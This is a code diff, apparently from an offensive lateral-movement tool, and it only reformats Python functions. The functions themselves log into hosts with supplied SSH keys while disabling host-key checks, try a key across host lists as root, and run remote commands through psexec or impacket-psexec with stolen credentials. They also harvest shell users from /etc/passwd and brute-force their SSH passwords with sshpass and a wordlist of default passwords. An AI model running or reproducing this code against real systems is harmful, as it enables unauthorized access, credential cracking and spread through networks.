@@ -79,8 +79,7 @@ def _detect_key_type(key_text: str) -> str:
     return "unknown"
 
 
-def ssh_key_login(target_host: str, ssh_user: str, key_b64: str,
-                   port: int = 22) -> Dict:
+def ssh_key_login(target_host: str, ssh_user: str, key_b64: str, port: int = 22) -> Dict:
     result = {"success": False, "method": "ssh_key_login"}
     key_path = "/tmp/_lat_ssh_" + os.urandom(4).hex()
     try:
@@ -88,10 +87,21 @@ def ssh_key_login(target_host: str, ssh_user: str, key_b64: str,
         with open(key_path, "w") as f:
             f.write(key_data)
         os.chmod(key_path, 0o600)
-        cmd = ["ssh", "-i", key_path, "-o", "StrictHostKeyChecking=no",
-               "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
-               "%s@%s" % (ssh_user, target_host), "-p", str(port),
-               "hostname;id;whoami"]
+        cmd = [
+            "ssh",
+            "-i",
+            key_path,
+            "-o",
+            "StrictHostKeyChecking=no",
+            "-o",
+            "ConnectTimeout=5",
+            "-o",
+            "BatchMode=yes",
+            "%s@%s" % (ssh_user, target_host),
+            "-p",
+            str(port),
+            "hostname;id;whoami",
+        ]
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
         if r.returncode == 0:
             result["success"] = True
@@ -112,9 +122,9 @@ def ssh_key_login(target_host: str, ssh_user: str, key_b64: str,
     return result
 
 
-def ssh_key_bruteforce_hosts(key_b64: str, username: str = "root",
-                              host_list: List[str] = None,
-                              ports: List[int] = None) -> List[Dict]:
+def ssh_key_bruteforce_hosts(
+    key_b64: str, username: str = "root", host_list: List[str] = None, ports: List[int] = None
+) -> List[Dict]:
     results = []
     ports = ports or [22]
     host_list = host_list or []
@@ -130,16 +140,28 @@ def ssh_key_bruteforce_hosts(key_b64: str, username: str = "root",
     return results
 
 
-def smb_exec_psexec(target_host: str, command: str,
-                     username: str, password: str,
-                     domain: str = ".") -> Dict:
+def smb_exec_psexec(
+    target_host: str, command: str, username: str, password: str, domain: str = "."
+) -> Dict:
     result = {"success": False, "method": "smb_psexec", "output": ""}
 
     if os.name == "nt":
         try:
             import subprocess
-            cmd = ["psexec", "\\\\" + target_host, "-u", domain + "\\" + username,
-                   "-p", password, "-h", "-s", "cmd.exe", "/c", command]
+
+            cmd = [
+                "psexec",
+                "\\\\" + target_host,
+                "-u",
+                domain + "\\" + username,
+                "-p",
+                password,
+                "-h",
+                "-s",
+                "cmd.exe",
+                "/c",
+                command,
+            ]
             r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
             result["success"] = r.returncode == 0
             result["output"] = (r.stdout or r.stderr or "")[:500]
@@ -148,7 +170,12 @@ def smb_exec_psexec(target_host: str, command: str,
     else:
         try:
             import subprocess
-            cmd = ["impacket-psexec", "%s/%s:%s@%s" % (domain, username, password, target_host), command]
+
+            cmd = [
+                "impacket-psexec",
+                "%s/%s:%s@%s" % (domain, username, password, target_host),
+                command,
+            ]
             r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
             result["success"] = r.returncode == 0
             result["output"] = (r.stdout or r.stderr or "")[:500]
@@ -163,9 +190,21 @@ def smb_exec_psexec(target_host: str, command: str,
 def crack_ssh_passwords(exec_fn: callable, wordlist: List[str] = None) -> Dict:
     result: Dict[str, Any] = {"success": False, "found": []}
     wordlist = wordlist or [
-        "root", "admin", "123456", "password", "root123",
-        "admin123", "toor", "Passw0rd", "P@ssw0rd", "changeme",
-        "ubuntu", "debian", "centos", "raspberry", "pi",
+        "root",
+        "admin",
+        "123456",
+        "password",
+        "root123",
+        "admin123",
+        "toor",
+        "Passw0rd",
+        "P@ssw0rd",
+        "changeme",
+        "ubuntu",
+        "debian",
+        "centos",
+        "raspberry",
+        "pi",
     ]
     try:
         r = exec_fn("cat /etc/passwd 2>/dev/null | grep -E 'sh$' | cut -d: -f1")
@@ -178,9 +217,21 @@ def crack_ssh_passwords(exec_fn: callable, wordlist: List[str] = None) -> Dict:
         for pw in wordlist:
             try:
                 r = subprocess.run(
-                    ["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
-                     "-o", "ConnectTimeout=3", "%s@localhost" % user, "id"],
-                    capture_output=True, text=True, timeout=8,
+                    [
+                        "sshpass",
+                        "-p",
+                        pw,
+                        "ssh",
+                        "-o",
+                        "StrictHostKeyChecking=no",
+                        "-o",
+                        "ConnectTimeout=3",
+                        "%s@localhost" % user,
+                        "id",
+                    ],
+                    capture_output=True,
+                    text=True,
+                    timeout=8,
                 )
                 if r.returncode == 0:
                     result["found"].append({"user": user, "password": pw})
